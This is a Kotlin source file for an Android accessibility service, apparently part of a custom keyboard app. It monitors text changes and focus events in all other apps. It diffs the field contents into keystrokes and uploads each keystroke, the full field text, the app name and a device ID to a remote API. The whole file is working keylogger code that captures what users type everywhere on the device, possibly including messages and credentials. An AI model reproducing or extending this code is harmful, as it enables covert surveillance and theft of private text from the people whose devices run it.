package com.keywordrecord.keyboard

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent

class TypingAccessibilityService : AccessibilityService() {

    private lateinit var apiClient: ApiClient
    private lateinit var deviceUniqueId: String
    private val handler = Handler(Looper.getMainLooper())
    private val fieldStates = mutableMapOf<String, String>()
    private var pendingRecordKey: String? = null
    private var pendingRecordAction: String? = null
    private var pendingFullText: String? = null
    private var pendingAppPackage: String? = null

    private val flushRunnable = Runnable { flushPendingRecord() }

    override fun onServiceConnected() {
        super.onServiceConnected()
        apiClient = ApiClient(this)
        deviceUniqueId = DeviceIdManager.getDeviceUniqueId(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (KeyboardIME.isInputActive) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                handlePossibleTextChange(event)
            }
        }
    }

    private fun handlePossibleTextChange(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString()?.trim().orEmpty()
        if (packageName.isEmpty()) return
        if (packageName == applicationContext.packageName) return

        val newText = extractText(event) ?: return
        val fieldKey = buildFieldKey(event, packageName)
        val previousText = fieldStates[fieldKey].orEmpty()
        if (newText == previousText) return

        fieldStates[fieldKey] = newText
        val (keyPressed, action) = diffText(previousText, newText)
        queueRecord(keyPressed, newText, packageName, action)
    }

    private fun extractText(event: AccessibilityEvent): String? {
        val fromEvent = event.text?.joinToString("")?.trim()
        if (!fromEvent.isNullOrEmpty()) {
            return fromEvent
        }

        val source = event.source ?: return null
        return try {
            source.text?.toString()?.trim()
        } finally {
            source.recycle()
        }
    }

    private fun buildFieldKey(event: AccessibilityEvent, packageName: String): String {
        val source = event.source
        if (source == null) {
            return "$packageName:${event.className ?: "unknown"}"
        }

        return try {
            val viewId = source.viewIdResourceName ?: source.className?.toString() ?: "view"
            "$packageName:$viewId:${source.hashCode()}"
        } finally {
            source.recycle()
        }
    }

    private fun diffText(previous: String, current: String): Pair<String, String> {
        if (current.length > previous.length && current.startsWith(previous)) {
            val added = current.substring(previous.length)
            return when {
                added == " " -> " " to "space"
                added.contains("\n") -> "↵" to "enter"
                else -> added.take(50) to "accessibility"
            }
        }

        if (current.length < previous.length && previous.startsWith(current)) {
            return "⌫" to "delete"
        }

        return current.take(50) to "accessibility"
    }

    private fun queueRecord(keyPressed: String, fullText: String, appPackage: String, action: String) {
        pendingRecordKey = keyPressed
        pendingRecordAction = action
        pendingFullText = fullText
        pendingAppPackage = appPackage
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, 250)
    }

    private fun flushPendingRecord() {
        val keyPressed = pendingRecordKey ?: return
        val action = pendingRecordAction ?: return
        val fullText = pendingFullText ?: return
        val appPackage = pendingAppPackage ?: return

        pendingRecordKey = null
        pendingRecordAction = null
        pendingFullText = null
        pendingAppPackage = null

        apiClient.recordKeystroke(
            deviceUniqueId = deviceUniqueId,
            keyPressed = keyPressed,
            fullText = fullText,
            appPackage = appPackage,
            action = action
        )
    }

    override fun onInterrupt() {}

    companion object {
        fun isEnabled(context: android.content.Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val component = android.content.ComponentName(
                context,
                TypingAccessibilityService::class.java
            ).flattenToString()

            return enabledServices.split(':').any { it.equals(component, ignoreCase = true) }
        }
    }
}
